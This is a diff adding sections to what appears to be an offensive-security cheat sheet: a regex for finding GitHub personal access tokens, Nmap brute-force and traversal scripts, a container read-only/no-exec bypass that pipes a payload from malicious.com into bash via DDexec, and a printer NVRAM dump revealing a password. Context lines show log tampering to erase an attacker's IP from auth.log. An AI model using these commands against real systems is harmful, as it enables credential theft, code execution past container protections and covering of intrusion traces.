@@ -93,6 +93,14 @@ cat ~/.php_history
 find /dir -xdev -perm +o=w ! \( -type d -perm +o=t \) ! -type l -print
 ```
 
+## Search GitHub for Personal Access Tokens:
+
+To use this regex expression on the webpage, prepend and append a `/` to the expression:
+
+```
+^github_pat_[A-Za-z0-9_]+$
+```
+
 ## Search for Hardcoded Passwords:
 
 ```
@@ -158,6 +166,36 @@ Uses crt.sh to identify certificates for target domain before screenshotting and
 ```
 root@RoseSecurity:~# curl -s 'https://crt.sh/?q=<Website_You_Want_To_Enumerate>&output=json' | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > ~/URLs.txt; eyewitness -f ~/URLs.txt --active-scan
 ```
+
+# Nmap TTPs:
+
+Below are useful Nmap scripts and their descriptions. You can find a full list of available scripts [here](https://nmap.org/nsedoc/scripts/):
+
+- `sshv1`: Checks if an SSH server supports the obsolete and less secure SSH Protocol Version 1.
+
+- `DHCP discover`: Sends a DHCPINFORM request to a host on UDP 67 to obtain all the local configuration parameters without allocating a new address.
+
+- `ftp-anon`: Checks if an FTP server allows anonymous logins.
+
+- `ftp-brute`: Performs brute force password auditing against FTP servers.
+
+- `http-enum`: Enumerates directories used by popular web applications and servers.
+
+- `http-passwd`: Checks if a webserver is vulnerable to directory traversal by attempting to retrieve etc/passwd or \boot(ini).
+
+- `http-methods`: Finds out what options are supported by an HTTP server by sending an OPTIONS request.
+
+- `ms-sql-info`: Attempts to determine configuration and version information for Microsoft SQL server instances.
+
+- `mysql-enum`: Performs valid-user enumeration against MySQL server using a bug.
+
+- `NSF-showmount`: Shows NFS exports, like the showmount -e command.
+
+- `rdp-enum-encryption`: Determines which encryption level is supposed by the RDP service.
+
+- `smb-enum-shares`: Attempts to list shares.
+
+- `tftp-enum`: Enumerates TFTP filenames by testing for a list of common ones.
 
 ## Nmap Scan Every Interface that is Assigned an IP:
 
@@ -400,6 +438,16 @@ Grep to remove sensitive attacker information then copy into original logs
 ```
 # cat /var/log/auth.log | grep -v "<Attacker IP>" > /tmp/cleanup.log
 # mv /tmp/cleanup.log /var/log/auth.log
+```
+
+## ASLR Enumeration:
+
+Address space layout randomization (ASLR) is a computer security technique involved in preventing exploitation of memory corruption vulnerabilities. In order to prevent an attacker from reliably jumping to, for example, a particular exploited function in memory, ASLR randomly arranges the address space positions of key data areas of a process, including the base of the executable and the positions of the stack, heap, and libraries. 
+
+- If the following equals 0, not enabled
+
+```
+cat /proc/sys/kernel/randomize_va_space 2>/dev/null
 ```
 
 # Reverse Shells:
@@ -993,6 +1041,31 @@ $ tshark -r <pcap> 'ntlmssp.auth.username' | awk '{print $13}' | sort -u
 $ tshark -i <interface> 'ntlmssp.auth.username' | awk '{print $13}' | sort -u
 ```
 
+## IP Information:
+
+```bash
+#!/usr/bin/env bash
+#
+# Access information on IP Addresses
+#
+# Color Output
+NC='\033[0m' 
+RED='\033[0;31m'          
+GREEN='\033[0;32m'
+
+ip=$1
+ipinfo () {
+	if [ -z ip ]; then	
+		echo -e "\n${RED}No IP Address Provided${NC}"
+	else
+		echo -e "\n${GREEN} IP Information for: $ip ${NC}"
+		curl ipinfo.io/$ip/json	
+	fi
+}
+
+ipinfo
+```
+
  ## Cloning Websites for Social Engineering with Wget:
  
  ```
@@ -1216,4 +1289,48 @@ Enumerate GitHub organizations for secrets and credentials
 
 ```console
 root@RoseSecurity# orgs=$(curl -s https://api.github.com/organizations | jq -r '.[] | .name'); for i in $orgs; do trufflehog github --org=$i; done
+```
+
+## Bypass File System Protections (Read-Only and No-Exec) for Containers:
+
+It's increasingly common to find Linux machines mounted with read-only (ro) file system protection, especially in containers. This is because running a container with `ro` file system is as easy as setting `readOnlyRootFilesystem: true` in the `securitycontext`:
+
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: victim-pod
+spec:
+  containers:
+  - name: alpine 
+    image: alpine
+    securityContext:
+      readOnlyRootFilesystem: true
+    command: ["sh", "-c", "while true; do echo 'RoseSecurity FTW'; done"]
+```
+
+However, even if the file system is mounted as `ro`, /dev/shm will still be writable, so it's fake we cannot write anything on the disk. However, this folder will be mounted with `no-exec` protection, so if you download a binary here you won't be able to execute it.
+
+[DDexec](https://github.com/arget13/DDexec) is a technique that allows you to modify the memory of your own process by overwriting its /proc/self/mem.
+```
+# Example
+wget -O- https://malicious.com/hacked.elf | base64 -w0 | bash ddexec.sh argv0 phone home
+```
+
+## Dumping Printer NVRAM:
+
+You can dump the NVRAM and extract confidential info (as passwords) by accessing arbitrary addresses using PJL:
+
+```
+# Using PRET
+./pret.py -q printer pjl
+Connection to printer established
+
+Welcome to the pret shell. Type help or ? to list commands.
+printer:/> nvram dump
+Writing copy to nvram/printer
+................................................................................
+................................................................................
+............................................S3cretPassw0rd......................
+................................................................................
 ```
